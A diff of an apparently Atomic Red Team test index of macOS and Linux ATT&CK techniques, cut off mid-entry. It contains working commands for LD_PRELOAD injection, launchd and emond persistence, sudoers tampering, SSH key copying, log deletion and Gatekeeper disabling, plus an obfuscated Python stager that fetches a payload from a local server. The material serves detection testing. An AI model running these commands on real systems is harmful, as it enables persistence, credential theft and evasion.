@@ -3362,7 +3362,9 @@ privilege-escalation:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
 '
-        cleanup_command: ''
+        cleanup_command: 'sudo sed -i ''/#{path_to_shared_library}/d'' /etc/ld.so.preload
+
+'
         name: bash
         elevation_required: true
     - name: Shared Library Injection via LD_PRELOAD
@@ -3545,36 +3547,32 @@ privilege-escalation:
 '
       supported_platforms:
       - macos
+      input_arguments:
+        plist_filename:
+          description: filename
+          type: string
+          default: com.atomicredteam.plist
+        path_malicious_plist:
+          description: Name of file to store in cron folder
+          type: string
+          default: "$PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist"
+      dependency_executor_name: bash
+      dependencies:
+      - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
+        prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
+          1; fi;'
+        get_prereq_command: echo "The shared library doesn't exist. Check the path";
+          exit 1;
       executor:
-        steps: |
-          1. Create file - .client
-
-          2. osascript -e 'tell app "Finder" to display dialog "Hello World"'
-
-          3. Place the following in a new file under ~/Library/LaunchAgents as com.atomicredteam.plist
-
-          4.
-          <?xml version="1.0" encoding="UTF-8"?>
-          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-          <plist version="1.0">
-          <dict>
-           <key>KeepAlive</key>
-           <true/>
-           <key>Label</key>
-           <string>com.client.client</string>
-           <key>ProgramArguments</key>
-           <array>
-           <string>/Users/<update path to .clent file>/.client</string>
-           </array>
-           <key>RunAtLoad</key>
-           <true/>
-           <key>NSUIElement</key>
-           <string>1</string>
-          </dict>
-          </plist>
-
-          5. launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist
-        name: manual
+        name: bash
+        elevation_required: true
+        command: |
+          if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
+          sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
+          sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
+        cleanup: |
+          sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}
+          sudo rm ~/Library/LaunchAgents/#{plist_filename}
   T1543.004:
     technique:
       external_references:
@@ -3650,26 +3648,31 @@ privilege-escalation:
 '
       supported_platforms:
       - macos
+      input_arguments:
+        plist_filename:
+          description: filename
+          type: string
+          default: com.atomicredteam.plist
+        path_malicious_plist:
+          description: Name of file to store in cron folder
+          type: string
+          default: "$PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist"
+      dependency_executor_name: bash
+      dependencies:
+      - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
+        prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
+          1; fi;'
+        get_prereq_command: echo "The plist file doesn't exist. Check the path and
+          try again."; exit 1;
       executor:
-        steps: |
-          1. Place the following file (com.example.hello) in /System/Library/LaunchDaemons or /Library/LaunchDaemons
-          2.
-          <?xml version="1.0" encoding="UTF-8"?>
-          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-          <plist version="1.0">
-          <dict>
-              <key>Label</key>
-              <string>com.example.hello</string>
-              <key>ProgramArguments</key>
-              <array>
-                  <string>hello</string>
-                  <string>world</string>
-              </array>
-              <key>KeepAlive</key>
-              <true/>
-          </dict>
-          </plist>
-        name: manual
+        name: bash
+        elevation_required: true
+        command: |
+          sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}
+          sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}
+        cleanup: |
+          sudo launchctl unload /Library/LaunchDaemons/#{plist_filename}
+          sudo rm /Library/LaunchDaemons/#{plist_filename}
   T1053.004:
     technique:
       external_references:
@@ -3732,47 +3735,28 @@ privilege-escalation:
         Event Monitor Daemon. \n"
       supported_platforms:
       - macos
-      - linux
+      input_arguments:
+        script_location:
+          description: evil plist location
+          type: path
+          default: "$PathToAtomicsFolder/T1053.004/src/atomicredteam_T1053_004.plist"
+        script_destination:
+          description: Path where to move the evil plist
+          type: path
+          default: "/etc/emond.d/rules/atomicredteam_T1053_004.plist"
+        empty_file:
+          description: Random name of the empty file used to trigger emond service
+          type: string
+          default: randomflag
       executor:
-        name: manual
-        steps: |-
-          1. Place this file in /etc/emond.d/rules/atomicredteam.plist
-          <?xml version="1.0" encoding="UTF-8"?>
-          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-          <plist version="1.0">
-          <array>
-              <dict>
-                  <key>name</key>
-                  <string>atomicredteam</string>
-                  <key>enabled</key>
-                  <true/>
-                  <key>eventTypes</key>
-                  <array>
-                      <string>startup</string>
-                  </array>
-                  <key>actions</key>
-                  <array>
-                      <dict>
-                          <key>command</key>
-                          <string>/usr/bin/say</string>
-                          <key>user</key>
-                          <string>root</string>
-                          <key>arguments</key>
-                              <array>
-                                  <string>-v Tessa</string>
-                                  <string>I am a persistent startup item.</string>
-                              </array>
-                          <key>type</key>
-                          <string>RunCommand</string>
-                      </dict>
-                  </array>
-              </dict>
-          </array>
-          </plist>
-
-          2. Place an empty file in /private/var/db/emondClients/
-
-          3. sudo touch /private/var/db/emondClients/randomflag
+        name: bash
+        elevation_required: true
+        command: |
+          sudo cp #{script_location} #{script_destination}
+          sudo touch /private/var/db/emondClients/#{empty_file}
+        cleanup_command: |
+          sudo rm #{script_destination}
+          sudo rm /private/var/db/emondClients/#{empty_file}
   T1078.003:
     technique:
       external_references:
@@ -5437,11 +5421,12 @@ privilege-escalation:
       supported_platforms:
       - macos
       executor:
-        command: 'echo osascript -e ''tell app "Finder" to display dialog "Hello World"''
-          >> /etc/rc.common
+        command: 'sudo echo osascript -e ''tell app "Finder" to display dialog "Hello
+          World"'' >> /etc/rc.common
 
 '
-        name: sh
+        elevation_required: true
+        name: bash
   T1547.007:
     technique:
       external_references:
@@ -5520,9 +5505,13 @@ privilege-escalation:
           type: path
           default: "/path/to/script"
       executor:
-        command: |
-          sudo defaults write com.apple.loginwindow LoginHook #{script}
-          sudo defaults delete com.apple.loginwindow LoginHook
+        command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
+
+'
+        cleanup: 'sudo defaults delete com.apple.loginwindow LoginHook
+
+'
+        elevation_required: true
         name: sh
   T1547.001:
     technique:
@@ -6774,11 +6763,8 @@ privilege-escalation:
       - linux
       executor:
         name: sh
-        command: |
-          sudo -l
-          sudo su
-          cat /etc/sudoers
-          vim /etc/sudoers
+        elevation_required: true
+        command: "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers\n"
     - name: Unlimited sudo cache timeout
       auto_generated_guid: a7b17659-dd5e-46f7-b7d1-e6792c91d0bc
       description: 'Sets sudo caching timestamp_timeout to a value for unlimited.
@@ -6791,6 +6777,7 @@ privilege-escalation:
       - linux
       executor:
         name: sh
+        elevation_required: true
         command: |
           sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
           sudo visudo -c -f /etc/sudoers
@@ -6805,6 +6792,7 @@ privilege-escalation:
       - linux
       executor:
         name: sh
+        elevation_required: true
         command: |-
           sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
           sudo visudo -c -f /etc/sudoers
@@ -11365,7 +11353,9 @@ persistence:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
 '
-        cleanup_command: ''
+        cleanup_command: 'sudo sed -i ''/#{path_to_shared_library}/d'' /etc/ld.so.preload
+
+'
         name: bash
         elevation_required: true
     - name: Shared Library Injection via LD_PRELOAD
@@ -11548,36 +11538,32 @@ persistence:
 '
       supported_platforms:
       - macos
+      input_arguments:
+        plist_filename:
+          description: filename
+          type: string
+          default: com.atomicredteam.plist
+        path_malicious_plist:
+          description: Name of file to store in cron folder
+          type: string
+          default: "$PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist"
+      dependency_executor_name: bash
+      dependencies:
+      - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
+        prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
+          1; fi;'
+        get_prereq_command: echo "The shared library doesn't exist. Check the path";
+          exit 1;
       executor:
-        steps: |
-          1. Create file - .client
-
-          2. osascript -e 'tell app "Finder" to display dialog "Hello World"'
-
-          3. Place the following in a new file under ~/Library/LaunchAgents as com.atomicredteam.plist
-
-          4.
-          <?xml version="1.0" encoding="UTF-8"?>
-          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-          <plist version="1.0">
-          <dict>
-           <key>KeepAlive</key>
-           <true/>
-           <key>Label</key>
-           <string>com.client.client</string>
-           <key>ProgramArguments</key>
-           <array>
-           <string>/Users/<update path to .clent file>/.client</string>
-           </array>
-           <key>RunAtLoad</key>
-           <true/>
-           <key>NSUIElement</key>
-           <string>1</string>
-          </dict>
-          </plist>
-
-          5. launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist
-        name: manual
+        name: bash
+        elevation_required: true
+        command: |
+          if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
+          sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
+          sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
+        cleanup: |
+          sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}
+          sudo rm ~/Library/LaunchAgents/#{plist_filename}
   T1543.004:
     technique:
       external_references:
@@ -11653,26 +11639,31 @@ persistence:
 '
       supported_platforms:
       - macos
+      input_arguments:
+        plist_filename:
+          description: filename
+          type: string
+          default: com.atomicredteam.plist
+        path_malicious_plist:
+          description: Name of file to store in cron folder
+          type: string
+          default: "$PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist"
+      dependency_executor_name: bash
+      dependencies:
+      - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
+        prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
+          1; fi;'
+        get_prereq_command: echo "The plist file doesn't exist. Check the path and
+          try again."; exit 1;
       executor:
-        steps: |
-          1. Place the following file (com.example.hello) in /System/Library/LaunchDaemons or /Library/LaunchDaemons
-          2.
-          <?xml version="1.0" encoding="UTF-8"?>
-          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-          <plist version="1.0">
-          <dict>
-              <key>Label</key>
-              <string>com.example.hello</string>
-              <key>ProgramArguments</key>
-              <array>
-                  <string>hello</string>
-                  <string>world</string>
-              </array>
-              <key>KeepAlive</key>
-              <true/>
-          </dict>
-          </plist>
-        name: manual
+        name: bash
+        elevation_required: true
+        command: |
+          sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}
+          sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}
+        cleanup: |
+          sudo launchctl unload /Library/LaunchDaemons/#{plist_filename}
+          sudo rm /Library/LaunchDaemons/#{plist_filename}
   T1053.004:
     technique:
       external_references:
@@ -11735,47 +11726,28 @@ persistence:
         Event Monitor Daemon. \n"
       supported_platforms:
       - macos
-      - linux
+      input_arguments:
+        script_location:
+          description: evil plist location
+          type: path
+          default: "$PathToAtomicsFolder/T1053.004/src/atomicredteam_T1053_004.plist"
+        script_destination:
+          description: Path where to move the evil plist
+          type: path
+          default: "/etc/emond.d/rules/atomicredteam_T1053_004.plist"
+        empty_file:
+          description: Random name of the empty file used to trigger emond service
+          type: string
+          default: randomflag
       executor:
-        name: manual
-        steps: |-
-          1. Place this file in /etc/emond.d/rules/atomicredteam.plist
-          <?xml version="1.0" encoding="UTF-8"?>
-          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-          <plist version="1.0">
-          <array>
-              <dict>
-                  <key>name</key>
-                  <string>atomicredteam</string>
-                  <key>enabled</key>
-                  <true/>
-                  <key>eventTypes</key>
-                  <array>
-                      <string>startup</string>
-                  </array>
-                  <key>actions</key>
-                  <array>
-                      <dict>
-                          <key>command</key>
-                          <string>/usr/bin/say</string>
-                          <key>user</key>
-                          <string>root</string>
-                          <key>arguments</key>
-                              <array>
-                                  <string>-v Tessa</string>
-                                  <string>I am a persistent startup item.</string>
-                              </array>
-                          <key>type</key>
-                          <string>RunCommand</string>
-                      </dict>
-                  </array>
-              </dict>
-          </array>
-          </plist>
-
-          2. Place an empty file in /private/var/db/emondClients/
-
-          3. sudo touch /private/var/db/emondClients/randomflag
+        name: bash
+        elevation_required: true
+        command: |
+          sudo cp #{script_location} #{script_destination}
+          sudo touch /private/var/db/emondClients/#{empty_file}
+        cleanup_command: |
+          sudo rm #{script_destination}
+          sudo rm /private/var/db/emondClients/#{empty_file}
   T1136.001:
     technique:
       external_references:
@@ -11862,7 +11834,7 @@ persistence:
       executor:
         command: |
           dscl . -create /Users/#{username}
-          dscl . -create /Users/#{username} UserShell /bin/bash
+          dscl . -create /Users/#{username} UserShell /bin/zsh
           dscl . -create /Users/#{username} RealName "#{realname}"
           dscl . -create /Users/#{username} UniqueID "1010"
           dscl . -create /Users/#{username} PrimaryGroupID 80
@@ -13356,11 +13328,12 @@ persistence:
       supported_platforms:
       - macos
       executor:
-        command: 'echo osascript -e ''tell app "Finder" to display dialog "Hello World"''
-          >> /etc/rc.common
+        command: 'sudo echo osascript -e ''tell app "Finder" to display dialog "Hello
+          World"'' >> /etc/rc.common
 
 '
-        name: sh
+        elevation_required: true
+        name: bash
   T1547.007:
     technique:
       external_references:
@@ -13439,9 +13412,13 @@ persistence:
           type: path
           default: "/path/to/script"
       executor:
-        command: |
-          sudo defaults write com.apple.loginwindow LoginHook #{script}
-          sudo defaults delete com.apple.loginwindow LoginHook
+        command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
+
+'
+        cleanup: 'sudo defaults delete com.apple.loginwindow LoginHook
+
+'
+        elevation_required: true
         name: sh
   T1108:
     technique:
@@ -16314,7 +16291,8 @@ credential-access:
         command: 'python2 laZagne.py all
 
 '
-        name: sh
+        elevation_required: true
+        name: bash
     - name: Extract passwords with grep
       auto_generated_guid: bd4cf0d1-7646-474e-8610-78ccf5a097c4
       description: 'Extracting credentials from files
@@ -16989,7 +16967,7 @@ credential-access:
           hidden answer with title "Software Update"''
 
 '
-        name: sh
+        name: bash
     - name: PowerShell - Prompt User for Password
       auto_generated_guid: 2b162bfd-0928-4d4c-9ec3-4d9f88374b52
       description: |
@@ -17430,11 +17408,20 @@ credential-access:
           [Keychain dumper](https://github.com/juuso/keychaindump)
       supported_platforms:
       - macos
+      input_arguments:
+        cert_import:
+          description: Specify the path of the certificates to import.
+          type: path
+          default: "/tmp/certs.pem"
+        cert_export:
+          description: Specify the path of the certificates to export.
+          type: path
+          default: "/tmp/certs.pem"
       executor:
         command: |
           security -h
-          security find-certificate -a -p > allcerts.pem
-          security import /tmp/certs.pem -k
+          security find-certificate -a -p > #{cert_export}
+          security import #{cert_export} -k
         name: sh
   T1056.001:
     technique:
@@ -18332,10 +18319,16 @@ credential-access:
           description: Specify interface to perform PCAP on.
           type: String
           default: en0A
+      dependency_executor_name: "/bin/zsh"
+      dependencies:
+      - description: Check if at least one of the tools are installed on the machine.
+        prereq_command: if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command -v
+          tshark)" ]; then exit 1; else exit 0; fi;
+        get_prereq_command: echo "Install tcpdump and/or tshark for the test to run.";
+          exit 1;
       executor:
-        command: |
-          tcpdump -c 5 -nnni #{interface}
-          tshark -c 5 -i #{interface}
+        command: "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v
+          tshark)\" ]; then sudo tshark -c 5 -i #{interface}; fi;\n"
         name: bash
         elevation_required: true
     - name: Packet Capture Windows Command Prompt
@@ -18967,14 +18960,21 @@ credential-access:
       - macos
       - linux
       input_arguments:
+        search_path:
+          description: Path where to start searching from.
+          type: path
+          default: "/"
         output_file:
           description: Output file containing locations of SSH key files
           type: path
           default: "/tmp/keyfile_locations.txt"
       executor:
         command: |
-          find / -name id_rsa >> #{output_file}
-          find / -name id_dsa >> #{output_file}
+          find #{search_path} -name id_rsa >> #{output_file}
+          find #{search_path} -name id_dsa >> #{output_file}
+        cleanup_command: 'rm #{output_file}
+
+'
         name: sh
     - name: Copy Private SSH Keys with CP
       auto_generated_guid: 7c247dc7-5128-4643-907b-73a76d9135c3
@@ -18985,6 +18985,10 @@ credential-access:
       supported_platforms:
       - linux
       input_arguments:
+        search_path:
+          description: Path where to start searching from.
+          type: path
+          default: "/"
         output_folder:
           description: Output folder containing copies of SSH private key files
           type: path
@@ -18992,8 +18996,11 @@ credential-access:
       executor:
         command: |
           mkdir #{output_folder}
-          find / -name id_rsa -exec cp --parents {} #{output_folder} \;
-          find / -name id_dsa -exec cp --parents {} #{output_folder} \;
+          find #{search_path} -name id_rsa -exec cp --parents {} #{output_folder} \;
+          find #{search_path} -name id_dsa -exec cp --parents {} #{output_folder} \;
+        cleanup_command: 'rm #{output_folder}
+
+'
         name: sh
     - name: Copy Private SSH Keys with rsync
       auto_generated_guid: 864bb0b2-6bb5-489a-b43b-a77b3a16d68a
@@ -19005,6 +19012,10 @@ credential-access:
       - macos
       - linux
       input_arguments:
+        search_path:
+          description: Path where to start searching from.
+          type: path
+          default: "/"
         output_folder:
           description: Output folder containing copies of SSH private key files
           type: path
@@ -19012,8 +19023,11 @@ credential-access:
       executor:
         command: |
           mkdir #{output_folder}
-          find / -name id_rsa -exec rsync -R {} #{output_folder} \;
-          find / -name id_dsa -exec rsync -R {} #{output_folder} \;
+          find #{search_path} -name id_rsa -exec rsync -R {} #{output_folder} \;
+          find #{search_path} -name id_dsa -exec rsync -R {} #{output_folder} \;
+        cleanup_command: 'rm -rf #{output_folder}
+
+'
         name: sh
   T1003.007:
     technique:
@@ -20257,7 +20271,7 @@ defense-evasion:
       dependencies:
       - description: The binary must exist on disk at specified location (#{file_to_pad})
         prereq_command: 'if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;'
-        get_prereq_command: cp /bin/ls /tmp/evil-binary
+        get_prereq_command: 'cp /bin/ls #{file_to_pad}'
       executor:
         command: 'dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}
 
@@ -20871,9 +20885,10 @@ defense-evasion:
       - linux
       executor:
         command: |
-          rm -rf /private/var/log/system.log*
-          rm -rf /private/var/audit/*
+          sudo rm -rf /private/var/log/system.log*
+          sudo rm -rf /private/var/audit/*
         name: sh
+        elevation_required: true
     - name: Overwrite Linux Mail Spool
       auto_generated_guid: 1602ff76-ed7f-4c94-b550-2f727b4782d4
       description: 'This test overwrites the Linux mail spool of a specified user.
@@ -23579,6 +23594,7 @@ defense-evasion:
         command: |
           sudo xattr -r -d com.apple.quarantine #{app_path}
           sudo spctl --master-disable
+        elevation_required: true
         name: sh
   T1484:
     technique:
@@ -23924,6 +23940,11 @@ defense-evasion:
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         command: |
           touch /var/tmp/T1564.001_mac.txt
@@ -24003,6 +24024,10 @@ defense-evasion:
         command: 'sudo dscl . -create /Users/#{user_name} UniqueID 333
 
 '
+        cleanup_command: 'sudo dscl . -delete /Users/#{username}
+
+'
+        elevation_required: true
         name: sh
   T1564.003:
     technique:
@@ -25477,7 +25502,9 @@ defense-evasion:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
 '
-        cleanup_command: ''
+        cleanup_command: 'sudo sed -i ''/#{path_to_shared_library}/d'' /etc/ld.so.preload
+
+'
         name: bash
         elevation_required: true
     - name: Shared Library Injection via LD_PRELOAD
@@ -30977,11 +31004,8 @@ defense-evasion:
       - linux
       executor:
         name: sh
-        command: |
-          sudo -l
-          sudo su
-          cat /etc/sudoers
-          vim /etc/sudoers
+        elevation_required: true
+        command: "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers\n"
     - name: Unlimited sudo cache timeout
       auto_generated_guid: a7b17659-dd5e-46f7-b7d1-e6792c91d0bc
       description: 'Sets sudo caching timestamp_timeout to a value for unlimited.
@@ -30994,6 +31018,7 @@ defense-evasion:
       - linux
       executor:
         name: sh
+        elevation_required: true
         command: |
           sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
           sudo visudo -c -f /etc/sudoers
@@ -31008,6 +31033,7 @@ defense-evasion:
       - linux
       executor:
         name: sh
+        elevation_required: true
         command: |-
           sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
           sudo visudo -c -f /etc/sudoers
@@ -35690,7 +35716,7 @@ discovery:
           cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}
           if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;
           find . -type f -iname *.pdf >> #{output_file}
-          cat #{output_file}; fi;
+          cat #{output_file}
           find . -type f -name ".*"
         cleanup_command: 'rm #{output_file}'
         name: sh
@@ -35767,7 +35793,7 @@ discovery:
           default: "/tmp/T1087.001.txt"
       executor:
         command: |
-          cat /etc/sudoers > #{output_file}
+          sudo cat /etc/sudoers > #{output_file}
           cat #{output_file}
         cleanup_command: 'rm -f #{output_file}
 
@@ -35973,7 +35999,7 @@ discovery:
       - linux
       executor:
         command: |
-          if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi; fi;
+          if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
           if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
           if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
         name: sh
@@ -36350,10 +36376,16 @@ discovery:
           description: Specify interface to perform PCAP on.
           type: String
           default: en0A
+      dependency_executor_name: "/bin/zsh"
+      dependencies:
+      - description: Check if at least one of the tools are installed on the machine.
+        prereq_command: if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command -v
+          tshark)" ]; then exit 1; else exit 0; fi;
+        get_prereq_command: echo "Install tcpdump and/or tshark for the test to run.";
+          exit 1;
       executor:
-        command: |
-          tcpdump -c 5 -nnni #{interface}
-          tshark -c 5 -i #{interface}
+        command: "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v
+          tshark)\" ]; then sudo tshark -c 5 -i #{interface}; fi;\n"
         name: bash
         elevation_required: true
     - name: Packet Capture Windows Command Prompt
@@ -37090,6 +37122,7 @@ discovery:
         command: |
           ps -ef | grep Little\ Snitch | grep -v grep
           ps aux | grep CbOsxSensorService
+          ps aux | grep falcond
         name: sh
     - name: Security Software Discovery - Sysmon Service
       auto_generated_guid: fe613cf3-8009-4446-9a0f-bc78a15b66c9
@@ -37956,8 +37989,8 @@ execution:
       supported_platforms:
       - macos
       executor:
-        command: 'osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings(''ignore'');exec(base64.b64decode(''aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK''));\\\\\\\"
-          | python &\\\"\"
+        command: 'osascript -e "do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings(''ignore'');exec(base64.b64decode(''aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg==''));\\\"
+          | python &\""
 
 '
         name: sh
@@ -38164,12 +38197,20 @@ execution:
       supported_platforms:
       - macos
       - linux
+      input_arguments:
+        script_path:
+          description: Script path
+          type: path
+          default: "/tmp/art.sh"
       executor:
         command: |
-          sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
-          sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
-          chmod +x /tmp/art.sh
-          sh /tmp/art.sh
+          sh -c "echo 'echo Hello from the Atomic Red Team' > #{script_path}"
+          sh -c "echo 'ping -c 4 8.8.8.8' >> #{script_path}"
+          chmod +x #{script_path}
+          sh #{script_path}
+        cleanup_command: 'rm #{script_path}
+
+'
         name: sh
     - name: Command-Line Interface
       auto_generated_guid: d0c88567-803d-4dca-99b4-7ce65e7b257c
@@ -38854,11 +38895,23 @@ execution:
 '
       supported_platforms:
       - macos
+      input_arguments:
+        executable_path:
+          description: Path of the executable to run.
+          type: path
+          default: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
+        label_name:
+          description: Path of the executable to run.
+          type: string
+          default: evil
       executor:
-        command: 'launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator
+        command: 'launchctl submit -l #{label_name} -- #{executable_path}
 
 '
-        name: sh
+        cleanup_command: 'launchctl remove #{label_name}
+
+'
+        name: bash
   T1053.004:
     technique:
       external_references:
@@ -38921,47 +38974,28 @@ execution:
         Event Monitor Daemon. \n"
       supported_platforms:
       - macos
-      - linux
+      input_arguments:
+        script_location:
+          description: evil plist location
+          type: path
+          default: "$PathToAtomicsFolder/T1053.004/src/atomicredteam_T1053_004.plist"
+        script_destination:
+          description: Path where to move the evil plist
+          type: path
+          default: "/etc/emond.d/rules/atomicredteam_T1053_004.plist"
+        empty_file:
+          description: Random name of the empty file used to trigger emond service
+          type: string
+          default: randomflag
       executor:
-        name: manual
-        steps: |-
-          1. Place this file in /etc/emond.d/rules/atomicredteam.plist
-          <?xml version="1.0" encoding="UTF-8"?>
